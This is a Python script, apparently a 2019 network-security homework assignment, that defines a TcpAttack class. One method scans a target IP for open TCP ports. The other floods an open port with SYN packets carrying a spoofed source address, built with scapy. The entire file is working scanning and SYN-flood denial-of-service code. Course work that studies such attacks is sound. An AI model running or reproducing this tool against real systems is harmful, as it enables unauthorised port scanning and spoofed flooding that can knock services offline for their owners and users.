#!/usr/bin/env python3

# Homework Number: 8
# Name: Calvin Walter Heintzelman
# ECN Login: cheintze
# Due Date: 3/21/2019

# Using python version 3.7.2
# TcpAttack.py

import os
import sys
import socket
from scapy.all import *
from scapy.layers.inet import IP, TCP

# class definition
class TcpAttack:

    # Initialize function
    def __init__(self, spoofIP, targetIP):
        # checks parameter types
        if not(isinstance(spoofIP, str) and isinstance(targetIP, str)):
            raise TypeError("Error! Class must be constructed with only strings")

        # sets instance variables
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    # writes a list of open ports from targetIP to output file
    def scanTarget(self, rangeStart, rangeEnd):
        # checks parameter types
        if not(isinstance(rangeStart, int) and isinstance(rangeEnd, int)):
            raise TypeError("Error! Parameters must be integers")

        # checks if port is open within the given range and appends it to a list if it is
        open_ports = []
        for test in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, test))
                open_ports.append(test)
            except:
                pass

        # outputs the open port list to file, one line at a time
        o_file = open("openports.txt", 'w')
        for open_port in open_ports:
            o_file.write(str(open_port) + '\n')
        o_file.close()

    # Attacks the given port by sending a number of SYN packets specified by numSyn
    def attackTarget(self, port, numSyn):

        # check argument types
        if not(isinstance(port, int) and isinstance(numSyn, int)):
            raise TypeError("Error! Parameters must be integers")

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)

        # check if port is open
        try:
            sock.connect((self.targetIP, port))
        # otherwise, return 0
        except:
            return 0

        # If the port is open, attack it
        for i in range(numSyn):  # sends a number of SYN packets equal to numSyn
            # set up packet
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header

            # attempt to send packet; it will a message if it succeeded
            try:
                send(packet)
            # if failed, print exception
            except Exception as e:
                print(e)

        # returns 1 since port is open, even if packets failed to send
        return 1
